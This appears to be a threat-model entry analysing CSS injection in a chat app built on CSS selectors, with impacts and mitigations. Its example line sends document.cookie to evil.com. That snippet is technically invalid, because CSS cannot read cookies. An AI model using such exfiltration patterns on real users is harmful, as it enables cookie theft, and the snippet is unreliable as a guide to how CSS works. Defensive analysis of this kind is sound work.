*   **Attack Surface: Malicious CSS Injection**
    *   **Description:** An attacker injects crafted CSS code into the chat that is then interpreted and rendered by other users' browsers.
    *   **How css-only-chat Contributes:** The core mechanism of the application relies on encoding chat messages within CSS selectors and styles. This inherently creates an avenue for injecting arbitrary CSS.
    *   **Example:** An attacker sends a message containing CSS like `body { background-image: url("https://evil.com/steal_cookies?" + document.cookie); }`. This could attempt to exfiltrate cookies or other browser data when another user views the message. Another example is injecting CSS to overlay fake login forms or deface the chat interface.
    *   **Impact:**
        *   UI manipulation and defacement.
        *   Potential for phishing attacks by mimicking legitimate UI elements.
        *   Browser resource exhaustion or crashes due to complex or malicious CSS.
        *   Limited potential for data exfiltration through CSS vulnerabilities or timing attacks.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   **Developer:**
            *   **Strict Content Security Policy (CSP):** Implement a restrictive CSP that limits the sources from which stylesheets can be loaded and restricts inline styles. This is challenging with the core design but could mitigate some external resource loading.
            *   **Careful Encoding/Escaping (though difficult for CSS):** While directly escaping CSS selectors is complex, developers could explore methods to sanitize or limit the characters allowed in messages that become part of CSS selectors. This is inherently difficult given the application's design.
            *   **Rate Limiting:** Implement rate limiting on message submissions to make it harder for attackers to flood the chat with malicious CSS.
            *   **Input Validation (limited applicability):** While full validation of CSS is complex, some basic checks on the structure of messages might help.
        *   **User:**
            *   **Use updated browsers:** Ensure browsers are up-to-date with the latest security patches.
            *   **Be cautious of unusual chat behavior:** If the chat interface looks broken or behaves strangely, be wary of potential attacks.
            *   **Consider browser extensions:** Some browser extensions might offer protection against certain types of CSS-based attacks.
